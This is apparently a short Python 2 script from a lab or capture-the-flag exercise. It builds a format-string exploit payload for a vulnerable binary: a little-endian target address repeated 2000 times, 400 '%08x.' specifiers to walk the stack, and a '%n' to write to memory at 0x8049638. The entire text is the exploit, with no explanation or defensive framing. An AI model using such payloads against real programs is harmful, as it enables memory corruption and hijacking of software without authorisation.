buffer = '%08x.' * 400
# 0x8049638
target_addr = '\x38\x96\x04\x08' 
padding = 'AAA' + target_addr * 2000 + buffer + '%n' +'AAA'
print padding